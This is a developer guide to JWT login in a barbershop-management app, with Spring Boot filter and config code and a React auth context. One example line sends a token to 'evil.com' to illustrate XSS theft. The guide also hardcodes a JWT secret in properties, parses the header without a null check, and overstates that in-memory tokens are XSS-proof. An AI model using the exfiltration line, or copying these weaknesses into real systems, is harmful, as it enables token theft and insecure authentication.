# JWT Authentication Implementation Guide

## Overview

This document explains how JWT (JSON Web Token) authentication works in the TrimminFlow application, including both backend and frontend implementations.

---

## Table of Contents

1. [What is JWT?](#what-is-jwt)
2. [How JWT Works](#how-jwt-works)
3. [Backend Implementation](#backend-implementation)
4. [Frontend Implementation](#frontend-implementation)
5. [Security Approach](#security-approach)
6. [Testing the Implementation](#testing-the-implementation)
7. [Troubleshooting](#troubleshooting)

---

## What is JWT?

JWT (JSON Web Token) is a secure way to transmit information between parties as a JSON object. In our case, it's used for authentication.

### JWT Structure

A JWT token looks like this:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjM0NSIsInJvbGUiOiJBRE1JTiJ9.signature
```

It has three parts separated by dots (`.`):

1. **Header** - Algorithm and token type
2. **Payload** - User data (userId, email, role, etc.)
3. **Signature** - Cryptographic signature to verify authenticity

### Why JWT?

- **Stateless**: Server doesn't need to store session data
- **Scalable**: Works well with microservices
- **Secure**: Cryptographically signed, can't be tampered with
- **Self-contained**: All user info is in the token

---

## How JWT Works

### The Authentication Flow

```
┌─────────────┐                                    ┌─────────────┐
│   BROWSER   │                                    │   BACKEND   │
└──────┬──────┘                                    └──────┬──────┘
       │                                                  │
       │ 1. POST /api/v1/auth/login                      │
       │    { email, password }                          │
       ├────────────────────────────────────────────────>│
       │                                                  │
       │                    2. Verify Password           │
       │                       (BCrypt compare)          │
       │                                                  │
       │                    3. Generate JWT Token        │
       │                       (with userId, email,      │
       │                        role, expiration)        │
       │                                                  │
       │ 4. Return JWT + User Info                       │
       │<────────────────────────────────────────────────┤
       │    {                                             │
       │      accessToken: "eyJhbGc...",                 │
       │      userId: "...",                              │
       │      email: "...",                               │
       │      firstName: "...",                           │
       │      role: "ADMIN"                               │
       │    }                                             │
       │                                                  │
       │ 5. Store Token in Memory (React State)          │
       │    NOT in localStorage!                         │
       │                                                  │
       │ 6. Make Protected Request                       │
       │    GET /api/v1/barbershops                      │
       │    Authorization: Bearer eyJhbGc...             │
       ├────────────────────────────────────────────────>│
       │                                                  │
       │                    7. Extract & Validate Token  │
       │                       (JwtAuthenticationFilter) │
       │                                                  │
       │                    8. Set User in Security      │
       │                       Context                   │
       │                                                  │
       │ 9. Return Protected Data                        │
       │<────────────────────────────────────────────────┤
       │                                                  │
```

---

## Backend Implementation

### 1. JWT Token Generation (`JwtUtil.java`)

**Location**: `src/main/java/com/trimminflow/demo/security/JwtUtil.java`

**What it does**:
- Generates JWT tokens with user information
- Validates tokens
- Extracts information from tokens

**Key Method - Generate Token**:
```java
public String generateToken(String email, UUID userId, String role) {
    Map<String, Object> claims = new HashMap<>();
    claims.put("userId", userId.toString());
    claims.put("role", role);

    return Jwts.builder()
        .claims(claims)                    // Add userId and role
        .subject(email)                    // Add email as subject
        .issuedAt(new Date())             // Token created time
        .expiration(new Date(now + 86400000)) // Expires in 24 hours
        .signWith(secretKey)              // Sign with secret key
        .compact();
}
```

**Configuration** (`application.properties`):
```properties
jwt.secret=TrimminFlowSecretKeyForJWTTokenGenerationThatShouldBeAtLeast256BitsLong
jwt.expiration=86400000  # 24 hours in milliseconds
```

---

### 2. Login Endpoint (`AuthController.java`)

**Location**: `src/main/java/com/trimminflow/demo/controller/AuthController.java`

**New Endpoint**:
```
POST /api/v1/auth/login
```

**Request Body**:
```json
{
  "email": "owner@barbershop.com",
  "password": "password123"
}
```

**Response**:
```json
{
  "accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "tokenType": "Bearer",
  "userId": "123e4567-e89b-12d3-a456-426614174000",
  "email": "owner@barbershop.com",
  "firstName": "John",
  "lastName": "Doe",
  "role": "ADMIN",
  "barbershopId": "456e7890-e89b-12d3-a456-426614174111",
  "message": "Login successful"
}
```

---

### 3. JWT Authentication Filter (`JwtAuthenticationFilter.java`)

**Location**: `src/main/java/com/trimminflow/demo/security/JwtAuthenticationFilter.java`

**What it does**:
This filter intercepts EVERY HTTP request and:

1. **Extracts JWT Token** from the `Authorization` header
   ```
   Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
   ```

2. **Validates the Token**
   - Checks signature
   - Checks expiration
   - Extracts user email and role

3. **Sets Authentication** in Spring Security Context
   - Tells Spring Security who the user is
   - Sets user's role for authorization

**How it works**:
```java
@Override
protected void doFilterInternal(
    HttpServletRequest request,
    HttpServletResponse response,
    FilterChain filterChain
) {
    // 1. Get Authorization header
    String authHeader = request.getHeader("Authorization");

    // 2. Extract token (remove "Bearer " prefix)
    String jwt = authHeader.substring(7);

    // 3. Validate and extract user info
    String userEmail = jwtUtil.extractEmail(jwt);
    String role = jwtUtil.extractRole(jwt);

    // 4. Set authentication in Spring Security
    UsernamePasswordAuthenticationToken authToken =
        new UsernamePasswordAuthenticationToken(
            userEmail,
            null,
            Collections.singletonList(new SimpleGrantedAuthority("ROLE_" + role))
        );
    SecurityContextHolder.getContext().setAuthentication(authToken);

    // 5. Continue to next filter
    filterChain.doFilter(request, response);
}
```

---

### 4. Security Configuration (`SecurityConfig.java`)

**Location**: `src/main/java/com/trimminflow/demo/config/SecurityConfig.java`

**Changes Made**:

1. **Added JWT Filter** to the security chain
2. **Set Session Management** to STATELESS (no server sessions)
3. **Defined Public vs Protected Routes**

```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) {
    http
        .csrf(csrf -> csrf.disable())  // Disable CSRF (JWT handles security)
        .sessionManagement(session -> session
            .sessionCreationPolicy(SessionCreationPolicy.STATELESS)  // No sessions
        )
        .authorizeHttpRequests(auth -> auth
            // PUBLIC - Anyone can access
            .requestMatchers(
                "/api/v1/auth/register",
                "/api/v1/auth/login",
                "/api/v1/health"
            ).permitAll()

            // PROTECTED - Must be authenticated
            .requestMatchers("/api/v1/barbershops/**").authenticated()
            .requestMatchers("/api/v1/users/**").authenticated()
            .anyRequest().authenticated()
        )
        // Add JWT filter BEFORE Spring Security's default filter
        .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);
}
```

---

## Frontend Implementation

### 1. Auth Context (`AuthContext.tsx`)

**Location**: `src/contexts/AuthContext.tsx`

**What it does**:
- Manages authentication state (user, token)
- Stores JWT token **IN MEMORY** (not localStorage!)
- Provides login/logout functions
- Integrates with axios interceptors

**Key Features**:

#### In-Memory Token Storage
```typescript
const [accessToken, setAccessToken] = useState<string | null>(null);
```

**Why in-memory?**
- ✅ Most secure approach
- ✅ Prevents XSS attacks from stealing token
- ❌ Token lost on page refresh (must re-login)

#### Login Function
```typescript
const login = async (email: string, password: string) => {
  const response = await fetch('http://localhost:8080/api/v1/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
  });

  const data = await response.json();

  // Store token in memory
  setAccessToken(data.accessToken);

  // Store user info in memory
  setUser({
    userId: data.userId,
    email: data.email,
    firstName: data.firstName,
    lastName: data.lastName,
    role: data.role,
    barbershopId: data.barbershopId,
  });
};
```

#### Logout Function
```typescript
const logout = () => {
  setAccessToken(null);
  setUser(null);
  window.location.href = '/login';
};
```

---

### 2. Axios Instance with Interceptors (`axios.ts`)

**Location**: `src/lib/axios.ts`

**What it does**:
- Creates an axios instance for API calls
- Automatically adds JWT token to every request
- Handles 401 (unauthorized) errors

#### Request Interceptor
```typescript
apiClient.interceptors.request.use((config) => {
  const token = tokenGetter?.();  // Get token from memory

  if (token) {
    config.headers.Authorization = `Bearer ${token}`;  // Add to header
  }

  return config;
});
```

**This means**: Every API call automatically includes the JWT token!

#### Response Interceptor
```typescript
apiClient.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response?.status === 401) {
      // Token expired or invalid - trigger logout
      window.dispatchEvent(new CustomEvent('auth:unauthorized'));
    }
    return Promise.reject(error);
  }
);
```

---

### 3. Login Page (`login/page.tsx`)

**Location**: `src/app/login/page.tsx`

**Features**:
- Email and password input fields
- Calls `login()` from AuthContext
- Redirects to dashboard on success
- Shows error messages on failure

**Usage**:
```typescript
const { login } = useAuth();

const handleSubmit = async (e) => {
  try {
    await login(email, password);
    router.push('/dashboard');  // Redirect to dashboard
  } catch (err) {
    setError(err.message);  // Show error
  }
};
```

---

### 4. Protected Dashboard (`dashboard/page.tsx`)

**Location**: `src/app/dashboard/page.tsx`

**Features**:
- Protected route (requires authentication)
- Redirects to login if not authenticated
- Displays welcome message with user's name
- Logout button

**Route Protection**:
```typescript
const { user, isAuthenticated, logout } = useAuth();

useEffect(() => {
  if (!isAuthenticated) {
    router.push('/login');  // Redirect to login
  }
}, [isAuthenticated]);
```

---

## Security Approach

### In-Memory Token Storage

**Why NOT localStorage?**

❌ **localStorage is vulnerable to XSS**:
```javascript
// Malicious script injected via XSS can steal token
const token = localStorage.getItem('token');
fetch('https://evil.com/steal', { body: token });
```

✅ **In-Memory is secure**:
```typescript
// Token only exists in React state
// XSS scripts cannot access it
const [accessToken, setAccessToken] = useState<string | null>(null);
```

**Trade-offs**:

| Storage Method | XSS Safe | CSRF Safe | Persists on Refresh |
|---------------|----------|-----------|---------------------|
| localStorage  | ❌ No    | ✅ Yes    | ✅ Yes              |
| Cookies (httpOnly) | ✅ Yes | ❌ No | ✅ Yes              |
| In-Memory     | ✅ Yes    | ✅ Yes    | ❌ No               |

**Our Choice**: In-Memory for maximum security, even though users must re-login on refresh.

---

### Token Flow Diagram

```
┌──────────────────────────────────────────────────────────┐
│                      USER LOGIN                          │
└────────────────────┬─────────────────────────────────────┘
                     │
                     ▼
         ┌───────────────────────┐
         │  POST /auth/login     │
         │  { email, password }  │
         └───────────┬───────────┘
                     │
                     ▼
         ┌───────────────────────┐
         │  Backend Verifies     │
         │  Password (BCrypt)    │
         └───────────┬───────────┘
                     │
                     ▼
         ┌───────────────────────┐
         │  Generate JWT Token   │
         │  - userId             │
         │  - email              │
         │  - role               │
         │  - expiration (24h)   │
         └───────────┬───────────┘
                     │
                     ▼
         ┌───────────────────────┐
         │  Return Token +       │
         │  User Info            │
         └───────────┬───────────┘
                     │
                     ▼
         ┌───────────────────────┐
         │  Frontend Stores in   │
         │  Memory (React State) │
         └───────────┬───────────┘
                     │
                     ▼
┌──────────────────────────────────────────────────────────┐
│              SUBSEQUENT REQUESTS                         │
└────────────────────┬─────────────────────────────────────┘
                     │
                     ▼
         ┌───────────────────────┐
         │  Axios Interceptor    │
         │  Adds Token to Header │
         │  "Bearer eyJhbGc..."  │
         └───────────┬───────────┘
                     │
                     ▼
         ┌───────────────────────┐
         │  Backend Filter       │
         │  Validates Token      │
         └───────────┬───────────┘
                     │
                     ▼
         ┌───────────────────────┐
         │  Sets Authentication  │
         │  in Security Context  │
         └───────────┬───────────┘
                     │
                     ▼
         ┌───────────────────────┐
         │  Access Protected     │
         │  Resources            │
         └───────────────────────┘
```

---

## Testing the Implementation

### Step 1: Start Backend

```bash
cd C:\Users\Maxi G\Documents\GitHub\TrimminFlow-Backend\demo
./mvnw spring-boot:run
```

Backend should start on: `http://localhost:8080`

---

### Step 2: Start Frontend

```bash
cd C:\Users\Maxi G\Documents\GitHub\TrimminFlow-FrontEnd\trimminflowf
npm run dev
```

Frontend should start on: `http://localhost:3000`

---

### Step 3: Register a New User

1. Navigate to: `http://localhost:3000/register`
2. Fill in the form:
   - Barbershop Name: Test Barbershop
   - Email: test@example.com
   - Password: password123
   - First Name: John
   - Last Name: Doe
   - Phone: +1234567890
   - Address: 123 Main St
3. Click "Register"
4. You should see a success message

---

### Step 4: Login

1. Navigate to: `http://localhost:3000/login`
2. Enter credentials:
   - Email: test@example.com
   - Password: password123
3. Click "Sign in"
4. You should be redirected to the dashboard

---

### Step 5: Verify Dashboard

1. You should see: "Welcome back, John!"
2. Your user info should be displayed
3. The logout button should work

---

### Step 6: Test Token in Browser DevTools

1. Open Browser DevTools (F12)
2. Go to Network tab
3. Make any request (refresh the page)
4. Click on any API request to `/api/v1/...`
5. Look at Request Headers:
   ```
   Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
   ```

---

### Step 7: Test Token Expiration

The token expires after 24 hours. To test:

1. **Option A**: Wait 24 hours (not practical)
2. **Option B**: Change expiration in `application.properties`:
   ```properties
   jwt.expiration=60000  # 1 minute
   ```
3. Login, wait 1 minute, try to access a protected route
4. You should be automatically logged out

---

## Troubleshooting

### Problem: "401 Unauthorized" on Protected Routes

**Cause**: Token not being sent or invalid

**Solution**:
1. Check Network tab - is `Authorization` header present?
2. Check token expiration
3. Verify backend is running
4. Check CORS configuration

---

### Problem: "Cannot read properties of null (user)"

**Cause**: User not authenticated

**Solution**:
1. Make sure you're logged in
2. Check if `isAuthenticated` is true
3. Add loading state while checking auth

---

### Problem: Token Lost on Refresh

**Cause**: In-memory storage (this is expected behavior)

**Solution**:
This is by design for security. Options:
1. Accept the behavior (most secure)
2. Implement refresh tokens (more complex)
3. Use sessionStorage (less secure)

---

### Problem: CORS Errors

**Cause**: Frontend and backend on different origins

**Solution**:
Verify `SecurityConfig.java`:
```java
configuration.setAllowedOrigins(List.of("http://localhost:3000"));
configuration.setAllowedHeaders(List.of("*"));
configuration.setAllowCredentials(true);
```

---

## Next Steps

### Future Enhancements

1. **Refresh Tokens**
   - Implement refresh tokens for persistent login
   - Store refresh token in httpOnly cookie

2. **Remember Me**
   - Optional persistent login using refresh tokens

3. **Token Revocation**
   - Add blacklist for invalidated tokens
   - Store in Redis or database

4. **Password Reset**
   - Email-based password reset flow
   - Temporary tokens for reset

5. **Multi-Factor Authentication (MFA)**
   - Add 2FA for additional security
   - SMS or authenticator app

---

## Summary

✅ **Backend**:
- JWT generation and validation
- Login endpoint
- JWT authentication filter
- Protected routes

✅ **Frontend**:
- Auth context with in-memory token storage
- Axios interceptors for automatic token injection
- Login page
- Protected dashboard
- Automatic logout on token expiration

✅ **Security**:
- In-memory token storage (XSS protection)
- Stateless authentication
- 24-hour token expiration
- BCrypt password hashing
- CORS protection

🎉 **Phase 1 Complete!**
